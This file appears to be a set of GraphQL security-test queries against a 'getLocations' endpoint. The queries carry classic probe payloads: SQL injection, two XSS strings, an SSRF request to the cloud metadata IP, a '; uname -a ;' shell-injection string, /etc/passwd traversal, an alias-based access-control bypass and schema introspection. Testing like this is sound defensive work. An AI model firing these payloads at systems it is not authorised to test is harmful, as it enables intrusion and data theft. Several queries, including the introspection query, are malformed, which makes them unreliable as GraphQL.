query.query:
query {
  getLocations(input: {}) {
    id
    name
    lat
    lng
  }
}

query {
  # Passing a classic SQL OR payload as a string to see if the backend concatenates/uses it unsafely
  getLocations(input: "' OR '1'='1' -- ") {
    getLocations
    name
    lat
    lng
  }
}

query {
  # Test whether returned or logged values are reflected without sanitization
  getLocations(input: "<script>alert('xss')</script>") {
    getLocations
    name
    lat
    lng
  }
}

query {
  # Provide an internal metadata URL to detect SSRF when the service fetches remote resources
  getLocations(input: "http://169.254.169.254/latest/meta-data/") {
    getLocations
    name
    lat
    lng
  }
}

query {
  # Provide a typical shell injection pattern to detect naive command execution
  getLocations(input: " ; uname -a ; ") {
    getLocations
    name
    lat
    lng
  }
}

query {
  # Attempt directory traversal style path to see if backend reads files based on input
  getLocations(input: "../../../../etc/passwd") {
    getLocations
    name
    lat
    lng
  }
}

query {
  # HTML fragment that may be reflected into templates without escaping
  getLocations(input: "<img src=x onerror=alert(1)>") {
    getLocations
    name
    lat
    lng
  }
}

query {
  # Normal call; used to test access control/deny behavior in the straightforward form
  getLocations(input: null) {
    getLocations
    name
    lat
    lng
  }
}

query {
  # Same operation but aliased to test ACL/deny bypass via aliasing (s: is the alias)
  s: getLocations(input: null) {
    getLocations
    name
    lat
    lng
  }
}

query {
  # Standard introspection to enumerate schema/type information
  __schema {
    getLocations {
      name
      fields {
        name
      }
    }
  }
}

query {
  # Intentionally misspelled field to provoke GraphQL error with suggested fields
  getLocations(input: {}) {
    getLocations
    namee
    lat
  }
}
